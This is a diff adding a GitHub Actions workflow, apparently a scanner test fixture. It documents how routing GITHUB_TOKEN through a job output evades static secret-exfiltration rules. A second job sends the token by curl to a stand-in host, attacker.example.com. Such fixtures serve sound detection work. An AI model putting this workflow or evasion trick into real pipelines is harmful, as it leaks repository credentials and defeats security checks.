@@ -1,0 +1,30 @@
+# EVASION: Multi-step secret exfiltration via job outputs bypasses SEC6-GH-004/005
+#
+# SEC6-GH-004/005 detect secrets used directly in run: blocks.
+# Routing a secret through a step output (GITHUB_OUTPUT → needs.X.outputs.Y)
+# splits the access across two jobs; neither job individually matches the pattern.
+# Cross-job data flow is invisible to static single-file analysis.
+#
+# Bypasses: SEC6-GH-004, SEC6-GH-005
+# Why undetectable: requires cross-job taint tracking
+name: Exfil via outputs
+on: push
+permissions:
+  contents: read
+
+jobs:
+  extract:
+    runs-on: ubuntu-latest
+    outputs:
+      tok: ${{ steps.get.outputs.tok }}
+    steps:
+      - id: get
+        run: echo "tok=$GITHUB_TOKEN" >> $GITHUB_OUTPUT
+
+  exfil:
+    needs: extract
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -d "data=${{ needs.extract.outputs.tok }}" \
+            https://attacker.example.com/collect
